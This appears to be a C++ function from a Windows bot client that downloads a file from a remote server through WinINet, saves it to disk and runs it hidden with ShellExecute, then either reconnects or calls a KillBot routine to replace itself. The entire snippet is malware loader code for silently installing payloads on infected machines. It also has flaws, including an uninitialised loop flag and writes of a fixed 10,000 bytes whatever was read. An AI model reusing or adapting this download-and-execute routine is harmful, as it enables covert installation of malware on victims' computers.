//-------------------------------------------download-----------------------------------------------------------
int download(string loca,string destination,string execute){
	
	int count=loca.find("/");
	string server=loca.substr(0,count+1);
	string location=loca.substr(count+1);
	
	



HINTERNET Internet, Conn, Req;
	

	Internet=InternetOpen(" ",INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
     if (Internet==NULL)
	 {
		 
		 return 1;
	 }
     Conn=InternetConnect(Internet,server.c_str(),INTERNET_DEFAULT_HTTP_PORT,NULL,NULL,INTERNET_SERVICE_HTTP,0,0);
          if (Conn==NULL)
		  {
			  
			  return 2;
		  }
		 
		  

	 Req=HttpOpenRequest(Conn,"GET",location.c_str(), NULL, NULL, NULL, INTERNET_FLAG_KEEP_CONNECTION, 0);
    if (Req==NULL)
	{
		
	    return 3;
	}
	HttpSendRequest(Req,NULL,0,NULL,0);
		char comm[1000000];
		DWORD read;
		FILE *File; 
		string command;
		bool b00l;
		File = fopen(destination.c_str(), "wb+"); 
	while(b00l)
	   {
        b00l = InternetReadFile(Req,comm,10000,&read);
        fwrite(comm, 1, 10000, File); 
        if(b00l && read == 0) break; 
		}
	fclose(File);
 
    InternetCloseHandle(Internet);   
	if(execute=="1 ")
	{
		ShellExecute(NULL,"open",destination.c_str(),0,0,SW_HIDE);
		connect(1);
	}
	else if(execute=="2 ")
	{	KillBot();
        ShellExecute(NULL,"open",destination.c_str(),NULL,NULL,SW_HIDE);
	      return 0;
	}
}
